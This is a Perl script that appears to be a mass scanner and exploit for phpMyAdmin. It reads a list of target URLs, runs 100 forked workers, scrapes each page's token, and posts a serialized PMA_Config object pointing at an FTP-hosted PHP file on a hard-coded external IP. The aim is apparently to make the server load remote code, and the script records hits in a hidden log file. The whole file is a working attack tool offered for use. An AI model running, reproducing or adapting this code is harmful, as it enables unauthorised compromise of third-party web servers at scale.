#!/usr/bin/perl 

use threads;
use Parallel::ForkManager;
use IO::Socket;
use URI::_foreign;
use URI::_generic;
use URI::_query;
use URI;
use LWP;
use LWP::Simple;
use LWP::UserAgent;
use LWP::Protocol::http;
use URI::http;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Headers;
use HTML::Parser;
use Getopt::Long;
use Time::HiRes qw(gettimeofday);
use MIME::Base64;

STDOUT->autoflush;

my @pmas; 

open(HANDLE, "<", "pmassh.txt");

while(my $leitura = <HANDLE>) {
	push(@pmas, $leitura);  
}

my $fm = Parallel::ForkManager->new(100);
foreach my $url (@pmas) {
    
    print "Counter: " . $count . "\n";

    my $pid = $fm->start;
    if ($pid == 0) {
        execute($url); 
        $fm->finish;
    }
    $count++;
}

sub execute {
    
    my $url = shift;
    chomp($url);  
    
    my $ua = LWP::UserAgent->new(agent => "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]", env_proxy => 1, keep_alive => 1,timeout => 20);
	$url =~ s/\x0a//g;
	print "[*] Trying: " . $url . "\n"; 

    my $ftp = "ftp://212.96.164.21/hearsec.php";
    #my $ftp = "ftp://192.234.198.123/hearsec.php";

    my $len = length($ftp);
    my $code = "a:1:\{i:0\;O:10:\"PMA_Config\":1:\{s:6:\"source\"\;s:" . $len . ":\"". $ftp ."\"\;\}\}";
    $code =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;

    my $cookie = HTTP::Cookies->new;
    my $token;
    my $req = HTTP::Request->new("GET", $url);
    my $res = $ua->request($req); 

    if ($res->is_success) {
        $join = join("",$res->as_string);
        if ($token=$join=~m#name="token" value="(.+?)"#sg) {
                $token = $1;
        }
    }else{
        exit; 
    }

    $cookie->extract_cookies($res);
    $attempt = "action=lay_navigation&eoltype=unix&token=" . $token . "&configuration=" . $code;
    $req = HTTP::Request->new("POST", $url);
    $cookie->add_cookie_header($req);
    $req->header(Referer => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content($attempt);
    $res = $ua->request($req);
    my $data = $res->as_string;
    
    if (index($data, "500 Status") != -1) {
        print "[NOT VULNERABLE] -> " . $url . "\n"; 
    } else {
        open(OUT, ">>.session.log");
        print OUT ("$url\n");
        close OUT;
        print "[VULNERABLE] -> " . $url . "\n";
    }
    
}
